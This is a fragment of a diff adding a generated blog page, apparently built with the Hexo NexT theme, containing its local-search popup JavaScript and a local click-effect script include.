+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击出现小红心 -->
+  
+    <script type="text/javascript" src="/js/src/clicklove.js"></script>
+  
+
+  <!-- 页面点击爆炸效果 -->
+  
+
+</body>
+</html>
+
